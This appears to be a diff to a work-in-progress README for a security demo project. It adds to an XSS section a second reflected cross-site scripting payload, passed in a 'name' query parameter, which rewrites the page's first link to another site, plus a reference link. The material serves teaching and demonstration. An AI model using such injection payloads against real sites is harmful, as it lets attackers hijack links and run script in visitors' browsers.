@@ -18,8 +18,16 @@ This project and this readme is WIP.
 
 ## XSS
 
+[Reference][1]
+
 ### Demo 1
 
 ```javascript
 ?name=guest<script>alert('XSS!')</script>
 ```
+
+```javascript
+?name=<script>window.onload = function() {var link=document.getElementsByTagName("a");link[0].href="https://duckduckgo.com/";}</script>
+```
+
+[1]: http://www.thegeekstuff.com/2012/02/xss-attack-examples/
